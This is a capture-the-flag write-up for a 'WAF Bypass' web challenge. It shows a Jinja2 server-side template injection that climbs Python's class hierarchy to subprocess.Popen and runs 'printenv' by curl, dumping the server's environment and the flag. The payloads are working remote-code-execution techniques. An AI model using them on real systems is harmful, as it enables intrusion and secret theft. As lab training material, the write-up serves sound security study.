# WAF Bypass

## ``______``

### Web

### Flag

```
WH2021{simple_ssti_bypass_is_so_simple_that_you_dont_need_a_brain_hahahahaha_SG-BTBLP}
```

_Is that a long flag or what_

### Steps

We should first take a look at ``app.py``, given that there don't seem to be any obvious attack or input vectors.

```python
if request.method == 'POST':
    payload = request.form['quote']
else:
    payload = "No WAF is a Crime"
    # WAF REDACTED
    template = '''
    %s''' % payload
    quote = render_template_string(template)
    return quote
```

According to ``@Ocean#5199``,

> The WAF filters `self`, `config`, `import` and `os`

Seems like we can pass a ``quote`` parameter by POST to ``/``, and the site is vulnerable to SSTI (our input is put into the template directly). We can test this by inputting ``{{7*"7"}}``, the litmus test for SSTI attacks. We are greeted with:

```bash
curl 'http://chals.whitehacks.ctf.sg:50401/' --data 'quote={{7*"7"}}'
7777777
```

This matches the behavior for Jinja2, which is common. We can now start looking online for SSTI payloads for Jinja2, such as https://blog.nvisium.com/p255. This was the basis for the exploit described below.

The core of the exploit is the ``__mro__``  attribute. By the documentation, it is

> a tuple of classes that are considered when looking for base classes during method resolution.

What. [This link](https://www.geeksforgeeks.org/method-resolution-order-in-python-inheritance/) provides a decent explanation of what this does. Basically, it stores the "parent" of whatever we are calling. By my understanding, this is similar ``__proto__`` in JavaScript (correct me if I'm wrong). Hence, the article describes a method where we use ```''```, an empty string, and climb up Python's hierarchy of methods.

```
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
```

This gives us a tuple. We can now traverse up to ``object``, and move down using ``__subclasses__`` as described.

```bash
curl 'http://chals.whitehacks.ctf.sg:50401/' --data-urlencode 'quote={{ "".__class__.__mro__[1].__subclasses__() }}'
[&lt;class &#39;type&#39;&gt; ... class &#39;unicodedata.UCD&#39;&gt;]
```

Whoa that's a lot of things. Using some VSCode trickery, we can find out that ``subprocess.Popen`` is index 425 on ``__mro__``. Hence, we can start moving down in that direction:

```bash
curl 'http://chals.whitehacks.ctf.sg:50401/' --data-urlencode 'quote={{ "".__class__.__mro__[1].__subclasses__()[425]("printenv",shell=True,stdout=-1).communicate() }}'
(b&#39;HOSTNAME=37e43fa0725a\nPYTHON_PIP_VERSION=21.0.1\nSHLVL=1\nHOME=/root\nFLASK_RUN_FROM_CLI=true\nGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nFLASK_APP=app.py\nPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/b60e2320d9e8d02348525bd74e871e466afdf77c/get-pip.py\nFLASK_RUN_HOST=0.0.0.0\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nLANG=C.UTF-8\nPYTHON_VERSION=3.7.10\nPWD=/code\nPYTHON_GET_PIP_SHA256=c3b81e5d06371e135fb3156dc7d8fd6270735088428c4a9a5ec1f342e2024565\nFLAG=WH2021{simple_ssti_bypass_is_so_simple_that_you_dont_need_a_brain_hahahahaha_SG-BTBLP}\n&#39;, None)
```

At this point, this is pretty standard usage of ``subprocess.Popen``, except we are not using it directly, rather by moving up and down Python's MRO. This essentially gives us RCE as we have a shell.